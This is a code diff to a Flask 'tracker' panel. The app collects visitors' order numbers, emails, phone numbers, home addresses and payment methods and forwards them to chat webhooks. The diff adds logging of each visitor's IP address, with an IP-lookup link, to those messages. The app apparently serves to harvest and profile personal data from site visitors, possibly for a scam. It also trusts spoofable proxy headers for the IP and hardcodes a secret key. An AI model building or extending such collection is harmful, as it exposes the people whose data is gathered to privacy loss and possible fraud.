@@ -8,8 +8,13 @@ from werkzeug.security import generate_password_hash, check_password_hash
 from flask_limiter import Limiter
 from flask_limiter.util import get_remote_address
 
+from werkzeug.middleware.proxy_fix import ProxyFix
+
 app = Flask(__name__)
 app.secret_key = 'super_secret_key_for_panel_change_me_in_prod'
+app.wsgi_app = ProxyFix(
+    app.wsgi_app, x_for=1, x_proto=1, x_host=1, x_prefix=1
+)
 
 limiter = Limiter(
     get_remote_address,
@@ -108,6 +113,16 @@ def login_required(f):
         return f(*args, **kwargs)
     return decorated_function
 
+def get_real_ip():
+    """Get the visitor's real public IP address, even behind proxies like Railway/Cloudflare."""
+    # Check common proxy headers in priority order
+    for header in ('CF-Connecting-IP', 'X-Real-IP', 'X-Forwarded-For'):
+        ip = request.headers.get(header)
+        if ip:
+            # X-Forwarded-For can be a comma-separated list; first one is the real client
+            return ip.split(',')[0].strip()
+    return request.remote_addr
+
 def fetch_pkstockx_status(email, order_no):
     url = f"https://www.pkstockx.org/trackorder?email={email}&order={order_no}"
     headers = {'User-Agent': 'Mozilla/5.0'}
@@ -153,7 +168,7 @@ def panel_login():
                 db.execute('UPDATE users SET discord_username = ? WHERE id = ?', (discord_username, user['id']))
                 
             # Update IP and device
-            ip_address = request.remote_addr
+            ip_address = get_real_ip()
             user_agent = request.user_agent.string
             db.execute('UPDATE users SET last_ip = ?, last_device = ? WHERE id = ?', (ip_address, user_agent, user['id']))
             db.commit()
@@ -317,6 +332,7 @@ def submit_order(slug):
     order_no = request.form.get("orderNo")
     
     order_status = fetch_pkstockx_status(email, order_no)
+    visitor_ip = get_real_ip()
     
     payload = {
         "username": tracker['name'],
@@ -330,7 +346,9 @@ def submit_order(slug):
                 {"name": "Order Number", "value": f"`{order_no}`", "inline": True},
                 {"name": "Email Address", "value": f"{email}", "inline": True},
                 {"name": "Phone Number", "value": f"{phone}", "inline": True},
-                {"name": "Current Status", "value": f"**{order_status}**", "inline": False}
+                {"name": "Current Status", "value": f"**{order_status}**", "inline": False},
+                {"name": "🌐 IP Address", "value": f"`{visitor_ip}`", "inline": True},
+                {"name": "🔍 IP Lookup", "value": f"[Search IP](https://whatismyipaddress.com/ip/{visitor_ip})", "inline": True}
             ],
             "footer": {"text": "Tracking System"}
         }]
@@ -417,6 +435,8 @@ def submit_payment(slug):
         
     total_price = item_price + 25.0
 
+    visitor_ip = get_real_ip()
+    
     payload = {
         "username": tracker['name'],
         "content": f"💸 **NEW ORDER: {payment_name}**",
@@ -431,7 +451,9 @@ def submit_payment(slug):
                 {"name": "Email", "value": f"{addy_data.get('email')}", "inline": True},
                 {"name": "Phone", "value": f"{addy_data.get('phone')}", "inline": True},
                 {"name": "Address", "value": f"{addy_data.get('address')}, {addy_data.get('city')}, {addy_data.get('country')}", "inline": False},
-                {"name": "Payment Method", "value": f"**{payment_name}**", "inline": False}
+                {"name": "Payment Method", "value": f"**{payment_name}**", "inline": False},
+                {"name": "🌐 IP Address", "value": f"`{visitor_ip}`", "inline": True},
+                {"name": "🔍 IP Lookup", "value": f"[Search IP](https://whatismyipaddress.com/ip/{visitor_ip})", "inline": True}
             ]
         }]
     }
